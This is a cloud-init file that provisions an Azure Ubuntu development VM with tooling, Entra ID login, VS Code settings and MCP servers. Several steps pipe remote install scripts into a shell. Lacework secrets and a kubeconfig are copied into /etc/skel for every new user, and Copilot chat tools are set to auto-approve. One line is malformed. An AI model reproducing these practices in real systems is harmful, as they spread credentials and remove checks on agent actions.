#cloud-config

timezone: America/Toronto
package_update: true
package_upgrade: true
package_reboot_if_required: true

disk_setup:
  /dev/sdb:
    table_type: gpt
    layout: true
    overwrite: true

ssh_deletekeys: false
ssh_keys:
  rsa_private: |
    ${indent(4, VAR_ssh_host_rsa_private)}
  rsa_public: |
    ${indent(4, VAR_ssh_host_rsa_public)}
  ecdsa_private: |
    ${indent(4, VAR_ssh_host_ecdsa_private)}
  ecdsa_public: |
    ${indent(4, VAR_ssh_host_ecdsa_public)}
  ed25519_private: |
    ${indent(4, VAR_ssh_host_ed25519_private)}
  ed25519_public: |
    ${indent(4, VAR_ssh_host_ed25519_public)}

apt:
  sources:
    authd:
      source: ppa:ubuntu-enterprise-desktop/authd
    dotnet:
      source: ppa:dotnet/backports
    ansible:
      source: ppa:ansible/ansible
    nvtop:
      source: ppa:quentiumyt/nvtop
    hashicorp:
      source: deb [arch=amd64 signed-by=$KEY_FILE] https://apt.releases.hashicorp.com $RELEASE main
      keyserver: https://apt.releases.hashicorp.com/gpg
      keyid: AA16FCBCA621E701
    github-cli:
      source: deb [arch=amd64 signed-by=$KEY_FILE] https://cli.github.com/packages stable main
      keyserver: https://cli.github.com/packages/githubcli-archive-keyring.gpg
      keyid: 23F3D4EA75716059
    azure-cli:
      source: deb [arch=amd64 signed-by=$KEY_FILE] https://packages.microsoft.com/repos/azure-cli/ $RELEASE main
      keyserver: https://packages.microsoft.com/keys/microsoft.asc
      keyid: EB3E94ADBE1229CF
    google-cloud-sdk:
      source: deb [arch=amd64 signed-by=$KEY_FILE] http://packages.cloud.google.com/apt cloud-sdk main
      keyserver: https://packages.cloud.google.com/apt/doc/apt-key.gpg
      keyid: C0BA5CE6DC6315A3
    google-chrome:
      source: deb [arch=amd64 signed-by=$KEY_FILE] http://dl.google.com/linux/chrome/deb/ stable main
      keyserver: https://dl-ssl.google.com/linux/linux_signing_key.pub
      keyid: 7721F63BD38B4796
    docker:
      source: deb [arch=amd64 signed-by=$KEY_FILE] https://download.docker.com/linux/ubuntu noble stable
      keyserver: https://download.docker.com/linux/ubuntu/gpg
      keyid: 8D81803C0EBFCD88
    vscode:
      source: deb [arch=amd64 signed-by=$KEY_FILE] https://packages.microsoft.com/repos/vscode stable main
      keyserver: https://packages.microsoft.com/keys/microsoft.asc
      keyid: EB3E94ADBE1229CF

packages:
  - alsa-utils
  - ansible
  - ansible-lint
  - apache2-utils
  - apparmor
  - apt-transport-https
  - asciidoctor
  - aspnetcore-runtime-9.0
  - autoconf
  - azure-cli
  - bash-completion
  - bat
  - build-essential
  - cabextract
  - ca-certificates
  - cockpit
  - code
  - cmake
  - curl
  - dos2unix
  - dotnet-sdk-9.0
  - dotnet-sdk-8.0
  - dotnet-sdk-6.0
  - dpkg
  - dpkg-dev
  - dnsutils
  - ffmpeg
  - file
  - fontconfig
  - fonts-powerline
  - frei0r-plugins
  - fuse3
  - fzf
  - g++
  - gh
  - gnupg
  - golang-go
  - graphviz
  - gstreamer1.0-libav
  - gstreamer1.0-vaapi
  - gstreamer1.0-plugins-base
  - gstreamer1.0-plugins-good
  - gstreamer1.0-plugins-bad
  - gstreamer1.0-plugins-ugly
  - google-cloud-cli
  - google-chrome-stable
  - hwloc
  - imagemagick
  - inkscape
  - iputils-ping
  - kubectl
  - ladspa-sdk
  - libapache2-mod-php
  - libavif-dev
  - libc6
  - libfuse3-3
  - libgcc-s1
  - libgstreamer1.0-0
  - libicu74
  - liblttng-ust1t64
  - libappindicator3-1
  - libdbusmenu-glib4
  - libdbusmenu-gtk3-4
  - libfftw3-bin
  - libfftw3-dev
  - libfftw3-long3
  - libfftw3-quad3
  - libfftw3-single3
  - libfuse2t64
  - libgavl2
  - libgl1-mesa-dri
  - libgl1
  - libgif-dev
  - libglu1-mesa
  - libhwloc-dev
  - libhwloc15
  - libmovit-dev
  - libnotify4
  - libnuma-dev
  - libpoppler-cpp-dev
  - librust-gdk-pixbuf-sys-dev
  - libsecret-1-0
  - libsecret-1-dev
  - libsecret-common
  - libsox-fmt-all
  - libstdc++6
  - libssl3t64
  - libslirp0
  - libglx-mesa0
  - libunwind8
  - libvulkan1
  - libvidstab-dev
  - libyelp-dev
  - locales
  - locales-all
  - lsb-release
  - lsd
  - make
  - melt
  - mesa-utils
  - mesa-utils-bin
  - mesa-vulkan-drivers
  - mtr
  - nmap
  - npm
  - nvtop
  - php
  - php-cli
  - php-cgi
  - php-mysql
  - php-pgsql
  - pigz
  - pkg-config
  - postgresql
  - postgresql-contrib
  - poppler-utils
  - python3-full
  - python3-pip
  - python3-venv
  - shellcheck
  - skopeo
  - slirp4netns
  - snapd
  - software-properties-common
  - squashfs-tools
  - swh-plugins
  - sox
  - sqlite3
  - terraform
  - tesseract-ocr
  - tini
  - tcpdump
  - tofrodos
  - trivy
  - ubuntu-drivers-common
  - unzip
  - vlc
  - vim-syntastic
  - weasyprint
  - xvfb
  - xdg-utils
  - yq
  - yamllint
  - yelp-tools
  - zsh
  - zlib1g

snap:
  commands:
    01: ['install', 'go', '--classic']
    02: ['install', 'shfmt']

write_files:
  - path: /root/prewarm-cache.sh
    permissions: '0755'
    owner: root:root
    content: |
      #!/bin/bash
      set -euxo pipefail

      VSCODE_SERVER_DIR="/root/.vscode-server"
      EXT_JSON="/etc/skel/40docs/.vscode/extensions.json"

      # Read extensions list
      EXT_LIST=\$$(jq -r '.recommendations[]' "\$${EXT_JSON}")

      # Install each extension
      for EXT in \$\$EXT_LIST; do
        code --install-extension "\$${EXT}" --force \
             --user-data-dir "\$${VSCODE_SERVER_DIR}/data" \
             --extensions-dir "\$${VSCODE_SERVER_DIR}/extensions"
      done

      # Trigger VSCode headless run to build cache
      DISPLAY="" code --no-sandbox \
          --user-data-dir "\$${VSCODE_SERVER_DIR}/data" \
          --extensions-dir "\$${VSCODE_SERVER_DIR}/extensions" \
          --disable-gpu --skip-welcome --skip-release-notes --disable-telemetry || true

      # Copy pre-warmed cache into /etc/skel for new users
      mkdir -p /etc/skel/.vscode-server
      cp -a "\$${VSCODE_SERVER_DIR}/extensions" /etc/skel/.vscode-server/
      cp -a "\$${VSCODE_SERVER_DIR}/data" /etc/skel/.vscode-server/
  - path: /etc/ssh/sshd_config.d/custom.conf
    content: |
      UsePAM yes
      KbdInteractiveAuthentication yes
      PrintMotd no
  - path: /etc/profile.d/nvm.sh
    owner: root:root
    permissions: '0644'
    content: |
      export NVM_DIR=/usr/local/nvm
      [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
      [ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"
  - path: /root/.tmux.conf
    content: |
      set -g default-terminal "screen-256color"
      set -g @plugin 'khanghh/tmux-dark-plus-theme'
      set -g @plugin 'tmux-plugins/tpm'
      set -g @plugin 'tmux-plugins/tmux-sensible'
      set -g window-active-style 'bg=colour235,fg=colour253'
      set -g window-style 'bg=colour235,fg=colour253'
      set -g pane-border-style 'bg=colour235, fg=colour59'
      set -g pane-active-border-style 'bg=colour235, fg=colour59'
      set -g status-style 'bg=colour32, fg=colour15'
      set -g window-status-style 'bg=default, fg=default'
      set -g window-status-current-style 'bg=colour39, fg=default'
      run '~/.tmux/plugins/tpm/tpm'
  - path: /root/.lacework.toml
    content: |
      [default]
        account = "${VAR_Forticnapp_account}"
        subaccount = "${VAR_Forticnapp_subaccount}"
        api_key = "${VAR_Forticnapp_api_key}"
        api_secret = "${VAR_Forticnapp_api_secret}"
        version = 2
  - path: /etc/skel/.lacework.toml
    content: |
      [default]
        account = "${VAR_Forticnapp_account}"
        subaccount = "${VAR_Forticnapp_subaccount}"
        api_key = "${VAR_Forticnapp_api_key}"
        api_secret = "${VAR_Forticnapp_api_secret}"
        version = 2
  - path: /root/clone-repos.sh
    permissions: '0755'
    owner: root:root
    content: |
      #!/bin/bash

      # GitHub organization name
      ORG="40docs"

      # GitHub API endpoint for public repositories
      API_URL="https://api.github.com/orgs/$ORG/repos?per_page=100"

      # Temporary file to store repo list
      TMP_FILE=$(mktemp)

      # Fetch all public repos (handle pagination if needed)
      PAGE=1
      while : ; do
        echo "Fetching page $PAGE..."
        curl -s "$API_URL&page=$PAGE" | jq -r '.[]?.clone_url' >> "$TMP_FILE"

        # Break if less than 100 repos (last page)
        COUNT=$(wc -l < "$TMP_FILE")
        if [ "$COUNT" -lt $((PAGE * 100)) ]; then
          break
        fi

        PAGE=$((PAGE + 1))
      done

      # Create a directory to hold the clones
      mkdir -p "/etc/skel/$ORG"
      cd "/etc/skel/$ORG" || exit 1

      # Clone each repository
      while IFS= read -r repo_url; do
        echo "Cloning $repo_url..."
        git clone "$repo_url"
      done < "$TMP_FILE"

      # Cleanup
      rm "$TMP_FILE"
      mkdir -p /etc/skel/40docs/.vscode
      cat <<'EOF' > /etc/skel/40docs/.vscode/settings.json
      {
        "chat.modeFilesLocations": {
          "chatmodes": true
        },
        "chat.promptFilesLocations": {
          "prompts": true
        },
        "chat.instructionsFilesLocations": {
          "instructions": true
        },
        "chat.tools.autoApprove": true,
        "chat.mcp.serverSampling": {
          "40docs/.vscode/mcp.json: github": {
            "allowedModels": [
              "github.copilot-chat/gpt-4.1",
              "github.copilot-chat/claude-3.5-sonnet"
            ]
          }
        },
        "dotnetAcquisitionExtension.existingDotnetPath": [
          {
            "extensionId": "MS-CST-E.vscode-devskim",
            "path": "/usr/lib/dotnet/dotnet"
          },
          {
            "extensionId": "ms-azuretools.vscode-azure-github-copilot",
            "path": "/usr/lib/dotnet/dotnet"
          }
        ],
        "dotnetAcquisitionExtension.sharedExistingDotnetPath": "/usr/lib/dotnet",
        "workbench.colorTheme": "Visual Studio Dark",
        "workbench.editor.enablePreview": false,
        "workbench.startupEditor": "none",
        "workbench.tips.enabled": false,
        "workbench.welcomePage.walkthroughs.openOnInstall": false,
        "workbench.welcomePage.enabled": false,
        "files.autoSave": "onWindowChange",
        "extensions.ignoreRecommendations": false,
        "extensions.showRecommendationsOnlyOnDemand": false,
        "extensions.autoUpdate": true,
        "update.showReleaseNotes": false,
        "files.eol": "\n",
        "files.insertFinalNewline": true,
        "files.trimTrailingWhitespace": true,
        "[markdown]": {
          "files.trimTrailingWhitespace": true,
          "editor.formatOnSave": true
        },
        "files.associations": {
          "*.chatmode.md": "markdown",
          "*.instructions.md": "markdown",
          "*.prompt.md": "markdown"
        },
        "terminal.integrated.defaultProfile.linux": "zsh",
        "terminal.integrated.profiles.linux": {
          "bash": {
            "path": "/bin/bash"
          },
          "pwsh": {
            "path": "/opt/microsoft/powershell/7/pwsh"
          },
          "tmux": {
            "path": "/usr/bin/tmux",
            "args": [
              "new-session",
              "-A",
              "-s",
              "vscode:$${workspaceFolder}"
            ]
          },
          "zsh": {
            "path": "/usr/bin/zsh"
          }
        },
        "remote.portForwarding.useLocalServer": true,
        "remote.autoForwardPorts": true,
        "remote.autoForwardPortsSource": "output",
        "github.copilot.enable": {
            "markdown": true,
            "plaintext": true
        },
        "github.copilot.chat.codesearch.enabled": true
      }
      EOF
      cat <<'EOF' > /etc/skel/40docs/.vscode/extensions.json
      {
        "recommendations": [
              "anderson.vscode-extension-paste-image",
              "alexcvzz.vscode-sqlite",
              "amazonwebservices.aws-toolkit-vscode",
              "amazonwebservices.amazon-q-vscode",
              "bmewburn.vscode-intelephense-client",
              "davidAnson.vscode-markdownlint",
              "dbaeumer.vscode-eslint",
              "donjayamanne.githistory",
              "dotjoshjohnson.xml",
              "editorconfig.editorconfig",
              "esbenp.prettier-vscode",
              "github.vscode-github-actions",
              "github.vscode-pull-request-github",
              "gitHub.copilot",
              "gitHub.copilot-chat",
              "GitHub.remotehub",
              "golang.go",
              "grapecity.gc-excelviewer",
              "hashicorp.terraform",
              "hediet.vscode-drawio",
              "jeff-hykin.polacode-2019",
              "lacework-security.lacework-code-security",
              "mhutchie.git-graph",
              "ms-azuretools.vscode-azurevirtualmachines",
              "ms-azuretools.vscode-azureresourcegroups",
              "ms-azuretools.vscode-containers",
              "ms-azuretools.vscode-docker",
              "ms-cst-e.vscode-devskim",
              "ms-dotnettools.csdevkit",
              "ms-kubernetes-tools.vscode-aks-tools",
              "ms-kubernetes-tools.vscode-kubernetes-tools",
              "ms-ossdata.vscode-pgsql",
              "ms-playwright.playwright",
              "ms-python.debugpy",
              "ms-python.autopep8",
              "ms-toolsai.jupyter",
              "ms-toolsai.jupyter-keymap",
              "ms-toolsai.vscode-jupyter-powertoys",
              "ms-vscode.azurecli",
              "ms-vscode.live-server",
              "ms-vscode.powershell",
              "ms-vscode.vscode-node-azure-pack",
              "ms-vsliveshare.vsliveshare",
              "msazurermtools.azurerm-vscode-tools",
              "mtxr.sqltools",
              "mtxr.sqltools-driver-pg",
              "nhoizey.gremlins",
              "nitayneeman.puppeteer-snippets",
              "okteto.remote-kubernetes",
              "omartawfik.github-actions-vscode",
              "openai.chatgpt",
              "pomdtr.excalidraw-editor",
              "postman.postman-for-vscode",
              "redhat.ansible",
              "redhat.java",
              "redhat.vscode-yaml",
              "richie5um2.vscode-sort-json",
              "streetsidesoftware.code-spell-checker",
              "timonwong.shellcheck",
              "tomoyukim.vscode-mermaid-editor",
              "vscjava.vscode-gradle",
              "vsls-contrib.codetour",
              "vscjava.vscode-maven",
              "vscjava.vscode-java-debug",
              "vscjava.vscode-java-dependency",
              "vscjava.vscode-java-pack",
              "vscjava.vscode-java-test",
              "visualstudioexptteam.vscodeintellicode",
              "visualstudioexptteam.intellicode-api-usage-examples",
              "weaveworks.vscode-gitops-tools",
              "yzhang.markdown-all-in-one"
        ]
      }
      EOF
      cat <<'EOF' > /etc/skel/40docs/.vscode/mcp.json
      {
        "servers": {
          "github": {
            "type": "http",
            "url": "https://api.githubcopilot.com/mcp/",
            "gallery": true
          },
          "kubernetes": {
            "type": "stdio",
            "command": "npx",
            "args": [
              "-y",
              "kubernetes-mcp-server@latest"
            ]
          },
          "playwright": {
            "command": "npx",
            "args": [
              "@playwright/mcp@latest"
            ]
          },
          "terraform": {
            "type": "stdio",
            "command": "docker",
            "args": [
              "run",
              "-i",
              "--rm",
              "hashicorp/terraform-mcp-server:latest"
            ],
            "gallery": true
          },
          "azure": {
            "type": "stdio",
            "command": "npx",
            "args": [
              "-y",
              "@azure/mcp@latest",
              "server",
              "start"
            ],
            "gallery": true
          },
          "microsoft-docs": {
            "type": "http",
            "url": "https://learn.microsoft.com/api/mcp",
            "gallery": true
          },
          "markitdown": {
            "type": "stdio",
            "command": "uvx",
            "args": [
              "markitdown-mcp"
            ],
            "gallery": true
          }
        },
        "inputs": []
      }
      EOF
      mkdir -p /etc/skel/40docs/.devcontainer
      cat <<'EOF' > /etc/skel/40docs/.devcontainer/devcontainer.json
      {
        "image": "ghcr.io/40docs/devcontainer:latest",
        "initializeCommand": "docker pull ghcr.io/40docs/devcontainer:latest",
        "runArgs": [
          "--hostname=devcontainer"
        ]
      }
      EOF
      cat <<'EOF' > /etc/skel/40docs/README.md
      # CloudShell

      Cloud Development Environment configured for deployment tasks, particularly focused on Fortinet and Lacework integrations.

      - Download and install [Visual Studio Code](https://code.visualstudio.com/Download).
      - Install the [Remote - SSH extension](https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-ssh) in Visual Studio Code.

      ## Cloud Accounts

      ### Fortinet

      ### GitHub

      ```bash
      git config --global user.name "John Doe"
      git config --global user.email johndoe@example.com
      gh auth login
      cd ~/40docs
      GITUSER=`GH_PAGER= gh api user --jq .login`
      mkdir "$GITUSER"
      cd "$GITUSER"
      gh repo fork fortinet/fortigate-terraform-deploy --clone
      ```

      ### Azure

      ```bash
      az login --use-device-code
      ```

      ## Deploy Fortigate

      1. Navigate to the Fortinet Terraform Deploy directory:

         ```bash
         cd ~/40docs/fortinet/fortigate-terraform-deploy
         ```

      1. Create an Azure Service Principal:

         ```bash
         az account list --query "[?name=='CSE-SE-DevOps'].id" --output tsv
         ```

         ```bash
         az ad sp create-for-rbac --role Contributor --scopes /subscriptions/{subscription-id} --json-auth > creds.json
         ```

      1. Terraform Apply

         ```bash
         terraform init
         terraform apply -auto-approve
         ```
      EOF
  - path: /root/npm-install.sh
    permissions: '0755'
    owner: root:root
    content: |
      #!/bin/bash
      set -eux
      export NVM_DIR=/usr/local/nvm
      mkdir -p "$NVM_DIR"
      git clone https://github.com/nvm-sh/nvm.git "$NVM_DIR"
      . "$NVM_DIR/nvm.sh"
      if [ -f /root/.npmrc ]; then
        mv /root/.npmrc /root/.npmrc.bak
      fi
      nvm install node
      nvm alias default node
      nvm use default --delete-prefix
      nvm use --delete-prefix v24.4.1 --silent || true
      npm config set prefix /usr/local
      npm config set loglevel verbose
      npm install --location=global --no-save @devcontainers/cli playwright
      playwright install --with-deps chromium && cp -a /root/.cache/ms-playwright /etc/skel/.cache/ms-playwright
      npm install --location=global markdownlint-cli2 bash-language-server cwebp dockerfile-language-server-nodejs eslint eslint-config-prettier gatsby-cli javascript-typescript-langserver jsonlint newman prettier puppeteer setup-eslint-config sql-language-server stylelint-config-prettier svgo unified-language-server vscode-css-languageserver-bin vscode-html-languageserver-bin vscode-json-languageserver-bin yaml-language-server --no-save
      CXXFLAGS="--std=gnu++20" npm install --location=global terminalizer --no-save
      OS=$(go env GOOS); ARCH=$(go env GOARCH); curl -fsSL -o cmctl https://github.com/cert-manager/cmctl/releases/latest/download/cmctl_$${OS}_$${ARCH}
      chmod +x cmctl
      sudo mv cmctl /usr/local/bin

runcmd:
  - echo "runcmd executed at $(date)"
  - |
    /usr/sbin/sgdisk --zap-all "/dev/disk/azure/scsi1/lun0"
    /usr/sbin/parted "/dev/disk/azure/scsi1/lun0" --script mklabel gpt
    /usr/sbin/parted "/dev/disk/azure/scsi1/lun0" --script mkpart primary ext4 0% 100%
    /usr/sbin/udevadm settle || sleep 5
    /sbin/mkfs.ext4 -F /dev/disk/azure/scsi1/lun0-part1
    mkdir -p /home
    grep -q /dev/disk/azure/scsi1/lun0-part1 /etc/fstab || echo "/dev/disk/azure/scsi1/lun0-part1 /home ext4 defaults,nofail 0 2" >> /etc/fstab
    mountpoint -q /home || mount "/dev/disk/azure/scsi1/lun0-part1" /home
  - mkdir -p /var/lib/authd/
  - |
    DEV=/dev/disk/azure/scsi1/lun2
    if ! blkid -s TYPE "$DEV" >/dev/null 2>&1; then
      echo "Formatting $DEV as ext4"
      mkfs.ext4 -F "$DEV"
    fi
  - echo '/dev/disk/azure/scsi1/lun2 /var/lib/authd/ ext4 defaults,nofail 0 2' >> /etc/fstab
  - mountpoint -q /var/lib/authd/ || mount /dev/disk/azure/scsi1/lun2 /var/lib/authd
  #- mkdir -p /mnt/authd-cache
  #- |
  #  DEV=/dev/disk/azure/scsi1/lun1
  #  if ! blkid -s TYPE "$DEV" >/dev/null 2>&1; then
  #    echo "Formatting $DEV as ext4"
  #    mkfs.ext4 -F "$DEV"
  #  fi
  #- echo '/dev/disk/azure/scsi1/lun1 /mnt/authd-cache ext4 defaults,nofail 0 2' >> /etc/fstab
  #- mountpoint -q /mnt/authd-cache || mount /dev/disk/azure/scsi1/lun1 /mnt/authd-cache
  - DEBIAN_FRONTEND=noninteractive apt-get install -y authd
  - snap install authd-msentraid
  - |
    sed -i \
      -e 's|issuer = https://login.microsoftonline.com/<ISSUER_ID>/v2.0|issuer = "https://login.microsoftonline.com/${VAR_Directory_tenant_ID}/v2.0"|' \
      -e 's|client_id = <CLIENT_ID>|client_id = "${VAR_Directory_client_ID}"|' \
      /var/snap/authd-msentraid/current/broker.conf
  - sed -i 's/^#allowed_users = OWNER$/allowed_users = ALL/' /var/snap/authd-msentraid/current/broker.conf
  - echo 'ssh_allowed_suffixes = @fortinet-us.com' >> /var/snap/authd-msentraid/current/broker.conf
  - sed -i 's/^\(LOGIN_TIMEOUT\t\t\)[0-9]\+/\1360/' /etc/login.defs
  #- |
  #  SNAP_CURRENT=$(readlink -f /var/snap/authd-msentraid/current)
  #  CACHED=$(find /mnt/authd-cache -maxdepth 1 -type d -name 'login.microsoftonline.com_*' | head -n1)
  #  LINK_TARGET="$SNAP_CURRENT/$(basename "$CACHED")"
  #  if [ -n "$CACHED" ]; then
  #    echo "Found login cache: $CACHED"
  #    if [ ! -e "$LINK_TARGET" ]; then
  #      echo "Linking $LINK_TARGET â†’ $CACHED"
  #      ln -s "$CACHED" "$LINK_TARGET"
  #    else
  #      echo "Login state already linked or exists at $LINK_TARGET"
  #    fi
  #  else
  #    echo "No cached login state found in /mnt/authd-cache"
  #  fi
  - mkdir -p /etc/authd/brokers.d/
  - cp /snap/authd-msentraid/current/conf/authd/msentraid.conf /etc/authd/brokers.d/msentraid.conf
  - mkdir -p /etc/systemd/system/authd.socket.d
  - |
    cat <<EOF >/etc/systemd/system/authd.socket.d/override.conf
    [Install]
    WantedBy=multi-user.target
    EOF
  - systemctl daemon-reload
  - systemctl enable --now authd.socket
  - systemctl restart authd
  - systemctl restart ssh
  #- mkdir -p /opt/authd
  #- |
  #  cat <<'EOF' >/opt/authd/watch_and_cache.sh
  #  #!/bin/bash
  #  LOGFILE="/var/log/authd-cache.log"
  #  echo "[authd-cache] Startup at $(date)" >> "$LOGFILE"
  #  SNAP_CURRENT=$(readlink -f /var/snap/authd-msentraid/current)
  #  echo "[authd-cache] Waiting for login state in $SNAP_CURRENT" >> "$LOGFILE"
  #  for i in {1..60}; do
  #    STATE_DIR=$(find "$SNAP_CURRENT" -maxdepth 1 -type d -name 'login.microsoftonline.com_*' | head -n1)
  #    if [ -n "$STATE_DIR" ]; then
  #      echo "[authd-cache] Found state at $STATE_DIR" >> "$LOGFILE"
  #      BASENAME=$(basename "$STATE_DIR")
  #      DEST="/mnt/authd-cache/$BASENAME"
  #      if [ ! -d "$DEST" ]; then
  #        echo "[authd-cache] Caching to $DEST" >> "$LOGFILE"
  #        cp -r "$STATE_DIR" "$DEST"
  #      else
  #        echo "[authd-cache] Already cached." >> "$LOGFILE"
  #      fi
  #      break
  #    fi
  #    sleep 10
  #  done
  #  echo "[authd-cache] Done." >> "$LOGFILE"
  #  EOF
  #- chmod +x /opt/authd/watch_and_cache.sh
  #- |
  #  cat <<EOF >/etc/systemd/system/authd-cache-watcher.service
  #  [Unit]
  #  Description=Watch for authd login state and persist it
  #  After=multi-user.target
  #  Wants=network-online.target
  #  [Service]
  #  Type=oneshot
  #  ExecStart=/opt/authd/watch_and_cache.sh
  #  StandardOutput=journal
  #  [Install]
  #  WantedBy=multi-user.target
  #  EOF
  #- systemctl daemon-reload
  #- systemctl enable authd-cache-watcher.service
  #- systemctl start authd-cache-watcher.service
  - curl -fsSL -o /tmp/get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3
  - chmod 700 /tmp/get_helm.sh
  - [bash, -lc, "/tmp/get_helm.sh"]
  - rm -f /tmp/get_helm.sh
  - mkdir -p /etc/skel/.local/state/vs-kubernetes/tools/helm/linux-amd64
  - ln -s /usr/local/bin/helm /etc/skel/.local/state/vs-kubernetes/tools/helm/linux-amd64/helm
  - mkdir -p /root/.kube/
  - bash -c 'echo "${VAR_KUBE_CONFIG}" | base64 -d > /root/.kube/config'
  - chmod 400 /root/.kube/config
  - chmod 500 /root/.kube
  = cp -a /root/.kube /etc/skel/
  - |
    echo 'export KUBECONFIG=$HOME/.kube/config' >> /root/.bashrc
    echo 'export KUBECONFIG=$HOME/.kube/config' >> /root/.profile
    echo 'export KUBECONFIG=$HOME/.kube/config' >> /root/.zshrc
  - wget https://github.com/aquasecurity/trivy/releases/download/v0.18.3/trivy_0.18.3_Linux-64bit.deb
  - [bash, -lc, "export DEBIAN_FRONTEND=noninteractive APT_LISTCHANGES_FRONTEND=none && dpkg -i trivy_0.18.3_Linux-64bit.deb"]
  - useradd -D -s "$(which zsh)"
  - sed -i -E 's|^#?DSHELL=.*|DSHELL=/usr/bin/zsh|' /etc/adduser.conf
  - [ sh, -xc, "echo 'ttf-mscorefonts-installer msttcorefonts/accepted-mscorefonts-eula select true' | debconf-set-selections" ]
  - [ sh, -xc, "DEBIAN_FRONTEND=noninteractive apt-get update -qq" ]
  - DEBIAN_FRONTEND=noninteractive apt-get full-upgrade -y
  - [ sh, -xc, "DEBIAN_FRONTEND=noninteractive apt-get install -y ttf-mscorefonts-installer ubuntu-restricted-extras libavcodec-extra libavcodec-extra60 ubuntu-restricted-addons unrar" ]
  - mkdir -p /root/.tmux/plugins && git clone https://github.com/tmux-plugins/tpm /root/.tmux/plugins/tpm && cp -a /root/.tmux /etc/skel/.tmux && cp /root/.tmux.conf /etc/skel/.tmux.conf
  - python3 -m pip install --break-system-packages --ignore-installed   numpy>=2.0   uvicorn>=0.22  scipy>=1.12 aider-install azure-cognitiveservices-speech black checkov docs-chat-bot fastapi gitlint git-filter-repo   google-api-python-client qrcode[pil] markitdown   mkdocs-add-teaser mkdocs-awesome-pages-plugin mkdocs-childpages-card-grid-plugin   mkdocs-enumerate-headings-plugin mkdocs-exclude mkdocs-git-authors-plugin   mkdocs-git-committers-plugin-2 mkdocs-github-admonitions-plugin   mkdocs-git-revision-date-localized-plugin mkdocs-glightbox mkdocs-literate-nav   mkdocs-material 'mkdocs-material[imaging]' mkdocs-minify-plugin mkdocs-monorepo-plugin   mkdocs-pdf-export-plugin mkdocs-same-dir mkdocs-section-index mkdocs-table-reader-plugin   mkdocs-with-pdf 'mkdocstrings[crystal]' 'mkdocstrings[python]'   oauth2client oterm pre-commit progressbar2 pydantic powerline-shell
  - mkdir -p "/usr/share/fonts/powerline" && curl -L https://github.com/powerline/powerline/raw/develop/font/PowerlineSymbols.otf -o /usr/share/fonts/powerline/PowerlineSymbols.otf && mkdir -p /etc/fonts/conf.avail && curl -L https://github.com/powerline/powerline/raw/develop/font/10-powerline-symbols.conf -o /etc/fonts/conf.avail/10-powerline-symbols.conf && fc-cache -f /usr/share/fonts
  - mkdir -p /etc/skel/.cache/
  - curl -s https://ohmyposh.dev/install.sh | bash -s -- -d /usr/local/bin -t /usr/local/share/oh-my-posh && curl -L -o /usr/local/share/oh-my-posh/powerlevel10k.omp.json https://raw.githubusercontent.com/amerintxperts/dotfiles/main/powerlevel10k.omp.json && oh-my-posh disable notice
  - mkdir -p /root/.oh-my-posh/themes/
  - curl https://raw.githubusercontent.com/40docs/dotfiles/refs/heads/main/powerlevel10k.omp.json -o /root/.oh-my-posh/themes/powerlevel10k.omp.json
  - oh-my-posh font install Meslo
  - cp -a /root/.oh-my-posh /etc/skel/.oh-my-posh
  #- bash -c "$(curl -fsSL https://raw.githubusercontent.com/ohmybash/oh-my-bash/master/tools/install.sh)" --unattended
  #- cp -a /root/.oh-my-bash /etc/skel/.oh-my-bash
  - echo 'eval "$(oh-my-posh init bash --config $HOME/.oh-my-posh/themes/powerlevel10k.omp.json)"' >> /root/.bashrc
  - export HOME=/root && curl https://raw.githubusercontent.com/lacework/go-sdk/main/cli/install.sh | bash -s --
  - echo 'source <(lacework completion bash)' >> /root/.bashrc
  - echo 'alias ls=lsd' >> /root/.bashrc
  - echo 'export OLLAMA_API_BASE=http://127.0.0.1:11434' >> /root/.bashrc
  #- sed -i '/^export OSH=/c\export OSH=~/.oh-my-bash' /etc/skel/.bashrc
  - lacework component install sca
  - lacework component install iac
  - lacework component install remediate
  - lacework component install vuln-scanner
  - curl -s https://raw.githubusercontent.com/terraform-linters/tflint/master/install_linux.sh | bash
  - touch /etc/skel/.hushlogin && touch /root/.hushlogin
  - |
    git clone --depth=1 https://github.com/tfutils/tfenv.git /root/.tfenv
    /root/.tfenv/bin/tfenv init
    /root/.tfenv/bin/tfenv install
    /root/.tfenv/bin/tfenv use
    cp -a /root/.tfenv /etc/skel/.tfenv
  - |
    DEV=/dev/disk/azure/scsi1/lun4
    if ! blkid -s TYPE "$DEV" >/dev/null 2>&1; then
      mkfs.ext4 -F "$DEV"
    fi
  - mkdir -p /root/.ollama
  - echo '/dev/disk/azure/scsi1/lun4 /root/.ollama       ext4 defaults,nofail 0 2' >> /etc/fstab
  - 'mountpoint -q /root/.ollama || mount /dev/disk/azure/scsi1/lun4 /root/.ollama'
  - export HOME=/root/.ollama && curl -fsSL https://ollama.com/install.sh | sh
  - systemctl start ollama.service
  - systemctl enable ollama.service
  - ollama pull deepseek-r1:latest
  - curl -s https://fluxcd.io/install.sh | bash
  - . /etc/os-release && curl -fsSL "https://packages.microsoft.com/config/ubuntu/$VERSION_ID/packages-microsoft-prod.deb" -o /tmp/packages-microsoft-prod.deb
  - [bash, -lc, "export DEBIAN_FRONTEND=noninteractive APT_LISTCHANGES_FRONTEND=none && dpkg -i /tmp/packages-microsoft-prod.deb"]
  - rm -f /tmp/packages-microsoft-prod.deb
  - apt-add-repository https://packages.microsoft.com/ubuntu/24.04/prod
  - apt-get update
  - apt-get install -y powershell
  - go install github.com/Azure/aztfexport@latest
  - export HOME=/root && sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended
  - sed -i 's/^plugins=.*$/plugins=(git zsh-syntax-highlighting zsh-autosuggestions ubuntu jsontools gh common-aliases conda-zsh-completion zsh-aliases-lsd zsh-tfenv z pip docker)/' /root/.zshrc
  - echo 'eval "$(oh-my-posh init zsh --config $HOME/.oh-my-posh/themes/powerlevel10k.omp.json)"' >> /root/.zshrc
  - echo 'export OLLAMA_API_BASE=http://127.0.0.1:11434' >> /root/.zshrc
  - mkdir -p /root/.oh-my-zsh/custom/plugins
  - git clone https://github.com/zsh-users/zsh-autosuggestions.git /root/.oh-my-zsh/custom/plugins/zsh-autosuggestions
  - git clone https://github.com/zsh-users/zsh-syntax-highlighting.git /root/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting
